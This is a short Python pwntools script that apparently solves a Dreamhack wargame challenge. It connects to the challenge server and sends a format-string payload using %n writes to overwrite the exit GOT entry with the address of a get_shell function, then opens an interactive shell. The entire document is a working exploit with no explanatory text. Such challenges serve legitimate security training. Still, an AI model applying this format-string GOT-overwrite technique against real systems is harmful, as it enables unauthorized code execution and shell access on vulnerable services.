from pwn import *

p = remote("host1.dreamhack.games", 8317)
elf = ELF("./basic_exploitation_002")

exit = elf.got['exit']
get_shell = 0x8048609

payload = p32(exit)
payload += p32(exit + 2)
payload += "%34305d"
payload += "%1$n"
payload += "%33275d"
payload += "%2$n"

p.send(payload)
p.interactive()